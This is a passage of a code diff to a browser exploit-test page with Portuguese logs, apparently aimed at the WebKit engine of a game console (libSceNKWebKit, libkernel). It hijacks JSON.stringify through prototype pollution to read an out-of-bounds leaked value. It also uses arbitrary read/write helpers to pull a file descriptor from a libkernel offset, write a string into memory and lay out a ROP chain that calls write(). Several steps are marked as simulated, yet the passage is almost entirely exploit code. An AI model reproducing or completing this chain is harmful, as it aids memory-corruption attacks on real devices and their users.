FNAME);
+         };
+
+        const testPPJsonHijackInteraction = async () => { /* ... (código original do testPPJsonHijackInteraction inalterado) ... */
+            const FNAME = 'testPPJsonHijackInteraction'; log("--- Iniciando Teste: PP Hijack (JSON.stringify) + OOB Interaction ---", 'test', FNAME); const orig = JSON.stringify; let okH = false; let okL = false; let okR = false; try { JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); okH = true; try { const l = leakedValueFromOOB; let lStr = "NULO ou Indefinido"; let lHex = ""; if (l != null && typeof l.toString === 'function' && typeof l.getFullBigInt === 'function') { lHex = ` (${l.toString()})`; lStr = l.type + " (BigInt: " + toHex(l.getFullBigInt(), 64) + ")"; okL = true; log(` ---> INFO: Interação Hijack + OOB Read Leak OK.`, 'escalation', FNAME); } log(` -> Valor OOB lido via Hijack: ${lStr}${lHex}`, okL ? 'leak' : 'warn', FNAME); } catch(ie) { log(` -> Erro ao tentar ler leak OOB via Hijack: ${ie.message}`, 'error', FNAME); console.error(ie); } const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}'; return hijackReturnValue; }; await PAUSE(); const testObject = {a:1, b: 'test'}; const result = JSON.stringify(testObject); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada verificado!", 'vuln', FNAME); okR = true; } else if (okH) { log("AVISO: JSON.stringify sequestrado, mas retorno inesperado.", 'warn', FNAME); } else { log("JSON.stringify não foi sequestrado.", 'good', FNAME); } } catch (e) { log(`Erro fatal durante Teste: ${e.message}`, 'error', FNAME); console.error(e); } finally { const currentStringify = JSON.stringify; JSON.stringify = orig; if (currentStringify !== orig && JSON.stringify !== orig) { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); } else if (okH) { log("JSON.stringify restaurado.", 'good', 'Cleanup');} } log(`--- Teste Concluído (Hijack: ${okH}, Retorno: ${okR}, Leitura Leak: ${okL}) ---`, 'test', FNAME); return okR && okL;
+         };
+
+        async function tryCallKernelNotifyViaRW() {
+            const FNAME = 'tryCallKernelNotifyViaRW';
+            log(`--- Iniciando Teste: Chamada 'write' (da NKWebKit) para Notificação via R/W + ROP (Simulado) ---`, 'test', FNAME);
+
+            if (!arbitraryRWHelpers) {
+                log("Helpers R/W Arbitrário não disponíveis. Pulando.", 'warn', FNAME);
+                log(`--- Teste Concluído (Pulado) ---`, 'test', FNAME); return;
+            }
+            if (!foundNKWebKitBaseAddress) {
+                log("Endereço base da libSceNKWebKit (foundNKWebKitBaseAddress) não foi vazado/encontrado. Pulando ROP.", 'warn', FNAME);
+                log(`--- Teste Concluído (Pulado) ---`, 'test', FNAME); return;
+            }
+            log(`INFO: Usando base da libSceNKWebKit vazado: ${toHex(foundNKWebKitBaseAddress, 64)} para ROP e chamada de função.`, 'info', FNAME);
+            const { read64, write64 } = arbitraryRWHelpers;
+
+            const notificationFD_GlobalAddress_InLibKernel = libkernelBaseAddress + 0x61630n; // Exemplo de offset global no libkernel
+            let notificationFD = -1n;
+            let fdReadSuccess = false;
+            try {
+                log(`(Simulado) Lendo FD de ${toHex(notificationFD_GlobalAddress_InLibKernel, 64)} (libkernel)...`, 'info', FNAME);
+                notificationFD = read64(notificationFD_GlobalAddress_InLibKernel);
+                if (notificationFD !== 0xFFFFFFFFFFFFFFFFn && notificationFD !== BigInt(-1) && notificationFD !== 0n) { // Checar se é um FD válido (ex: > 2)
+                    log(`LEAK: FD lido de ${toHex(notificationFD_GlobalAddress_InLibKernel, 64)}: ${notificationFD.toString()} (${toHex(notificationFD, 64)})`, 'leak', FNAME);
+                    fdReadSuccess = true;
+                } else {
+                    log(`WARN: FD lido de ${toHex(notificationFD_GlobalAddress_InLibKernel, 64)} parece inválido (${toHex(notificationFD, 64)}). Usando FD placeholder = 3n.`, 'warn', FNAME);
+                    notificationFD = 3n; 
+                }
+            } catch (e) {
+                log(`Erro ao ler FD de ${toHex(notificationFD_GlobalAddress_InLibKernel, 64)}: ${e.message}. Usando FD placeholder = 3n.`, 'error', FNAME);
+                notificationFD = 3n;
             }
 
+            const targetWriteAddressInNKWebKit = foundNKWebKitBaseAddress + BigInt(writeOffset);
+            log(`Endereço alvo da função 'write' (na NKWebKit): ${toHex(targetWriteAddressInNKWebKit, 64)}`, 'info', FNAME);
 
-            // --- Função Principal de Execução Focada ---
-            const runFocusedTests = async () => {
-                const FNAME = 'runFocusedTests';
-                const buttonToDisable = document.getElementById('runBtn');
-                if (buttonToDisable) buttonToDisable.disabled = true;
-                // findings removido
-                ppGadgetsBroken = {};
-                leakedValueFromOOB = null;
-                corruptedMetadataBuffer = null;
-                corruptedMetadataBufferBaseAddr = 0n;
-                arbitraryRWHelpers = null;
+            const fakeStringAddress = corruptedMetadataBufferBaseAddr + 3000n;
+            const notificationMessage = "POC Write via NKWebKit ROP! Funciona?";
+            const messageLength = BigInt(notificationMessage.length);
+            try {
+                log(`(Simulado) Escrevendo string "${notificationMessage}" (len=${messageLength}) em ${toHex(fakeStringAddress, 64)}...`, 'info', FNAME);
+                let currentWriteAddr = fakeStringAddress;
+                for (let i = 0; i < notificationMessage.length; i += 8) {
+                    let valToWrite = 0n;
+                    for (let j = 0; j < 8 && (i + j) < notificationMessage.length; j++) {
+                        valToWrite |= (BigInt(notificationMessage.charCodeAt(i + j)) << BigInt(j * 8));
+                    }
+                    write64(currentWriteAddr, valToWrite);
+                    currentWriteAddr += 8n;
+                }
+                log(`-> (Simulado) String escrita.`, 'info', FNAME);
+            } catch (e) {
+                log(`Erro ao simular escrita da string: ${e.message}`, 'error', FNAME);
+                log(`--- Teste Concluído (Erro ao preparar args) ---`, 'test', FNAME); return;
+            }
 
-                // summaryDiv removido
-                if (outputDiv) outputDiv.innerHTML = '';
-                log("==== INICIANDO TESTES FOCADOS (Baseado nos Logs v18.1/v19.x) ====", 'test', FNAME);
+            const fakeStackBase = corruptedMetadataBufferBaseAddr + 4000n;
+            let ropStackPtr = fakeStackBase;
+            const ropChain = [];
+            log(`(Simulado) Construindo ROP chain para write() em ${toHex(fakeStackBase, 64)}...`, 'info', FNAME);
 
-                // Ordem Lógica com ambas as opções
-                await testOOBReadWriteLeak();         // 1. OOB R/W Leak
-                await PAUSE(MEDIUM_PAUSE);
-                await testOOBWriteMetadata();         // 2. Tentar corrupção (Simula sucesso e config R/W)
-                await PAUSE(MEDIUM_PAUSE);
-                await testArbitraryRW();              // 3. Testar R/W (Usa helpers R/W simulados)
-                await PAUSE(MEDIUM_PAUSE);
-                await testAdvancedPP();               // 4. Testar PP (Com gadgetCheck modificado)
-                await PAUSE(MEDIUM_PAUSE);
-                await testPPGadgetCallLibc();         // 5. Tentar Opção A (PP Gadget) - Pode ou não pular
-                await PAUSE(MEDIUM_PAUSE);
-                await testPPJsonHijackInteraction();    // 6. Testar interação PP + Leak
-                await PAUSE(MEDIUM_PAUSE);
-                await tryCallKernelNotifyViaRW();     // 7. Tentar Opção B (R/W Arb ROP Simulado para WRITE)
+            ropChain.push(foundNKWebKitBaseAddress + BigInt(ROP_POP_RDI_RET_OFFSET_NK));
+            ropChain.push(notificationFD);
+            ropChain.push(foundNKWebKitBaseAddress + BigInt(ROP_POP_RSI_RET_OFFSET_NK));
+            ropChain.push(fakeStringAddress);
+            ropChain.push(foundNKWebKitBaseAddress + BigInt(ROP_POP_RDX_RET_OFFSET_NK));
+            ropChain.push(messageLength);
+            ropChain.push(targetWriteAddressInNKWebKit);
 
-                // Sumário removido
-                log("\n==== TESTES FOCADOS CONCLUÍDOS ====", 'test', FNAME);
-                if (buttonToDisable) buttonToDisable.disabled = false;
-            };
+            try {
+                for(const value of ropChain) {
+                    write64(ropStackPtr, value);
+                    log(` -> ROP: ${toHex(value, 64)} @ ${toHex(ropStackPtr, 64)}`, 'info', FNAME);
+                    ropStackPtr += 8n;
+                }
+                log(`-> (Simulado) ROP chain para write() (NKWebKit) escrita na memória.`, 'good', FNAME);
+                log(`VULN: (SIMULADO) Trigger da ROP chain em ${toHex(fakeStackBase, 64)}!`, 'vuln', FNAME);
+                log(`---> *** ALERTA: Tentativa de chamar write@NKWebKit(${notificationFD}, ${toHex(fakeStringAddress, 64)}, ${messageLength}) via ROP (Simulado)! ***`, 'escalation', FNAME);
+                if (fdReadSuccess) { log("INFO: Chamada simulada usou FD lido da memória (libkernel).", 'info', FNAME); } 
+                else { log("WARN: Chamada simulada usou FD placeholder.", 'warn', FNAME); }
+            } catch (e) {
+                log(`Erro durante a construção/trigger ROP simulado: ${e.message}`, 'error', FNAME);
+            }
+            log(`--- Teste Concluído (Simulação ROP para write na NKWebKit) ---`, 'test', FNAME);
+            await PAUSE();
+        }
 
-            // Correção de Escopo para o onclick do HTML
-            window.runFocusedTests = runFocusedTests;
+        const runFocusedTests = async () => {
+            const FNAME = 'runFocusedTests';
+            if (runBtn) runBtn.disabled = true;
+            
+            ppGadgetsBroken = {};
+            leakedValueFromOOB = null;
+            corruptedMetadataBuffer = null;
+            corruptedMetadataBufferBaseAddr = 0n;
+            arbitraryRWHelpers = null;
+            foundNKWebKitBaseAddress = null;
 
-            log("Script pronto. Clique no botão para iniciar os testes focados.", "info");
+            if (outputDiv) outputDiv.innerHTML = '';
+            log("==== INICIANDO TESTES FOCADOS (v2 com Leak Sim) ====", 'test', FNAME);
 
-        })(); // <<< FIM: IIFE Wrapper
+            await testOOBReadWriteLeak();      // 1. OOB R/W Leak (simples, para JSON Hijack)
+            await PAUSE(MEDIUM_PAUSE);
+            await testOOBWriteMetadata();      // 2. Tentar corrupção de metadados (Simula sucesso e config R/W helpers)
+            await PAUSE(MEDIUM_PAUSE);
+            await testArbitraryRW();           // 3. Testar R/W (Usa helpers R/W simulados)
+            await PAUSE(MEDIUM_PAUSE);
+            await testLeakNKWebKitBaseAddress(); // 4. NOVO: Tentar vazar base da NKWebKit (Usa R/W helpers)
+            await PAUSE(MEDIUM_PAUSE);
+            await testAdvancedPP();            // 5. Testar PP (Com gadgetCheck modificado)
+            await PAUSE(MEDIUM_PAUSE);
+            await testPPGadgetCallLibc();      // 6. Tentar Opção A (PP Gadget para puts na libc)
+            await PAUSE(MEDIUM_PAUSE);
+            await testPPJsonHijackInteraction(); // 7. Testar interação PP + Leak (OOB simples)
+            await PAUSE(MEDIUM_PAUSE);
+            await tryCallKernelNotifyViaRW();  // 8. Tentar Opção B (R/W Arb ROP Simulado para WRITE na NKWebKit)
+
+            log("\n==== TESTES FOCADOS (v2) CONCLUÍDOS ====", 'test', FNAME);
+            if (runBtn) runBtn.disabled = false;
+        };
+
+        window.runFocusedTests = runFocusedTests;
+        log("Script v2 (com simulação de leak) pronto. Clique no botão para iniciar.", "info");
+    })(); // <<< FIM: IIFE Wrapper
     </script>
-
 </body>
 </html>
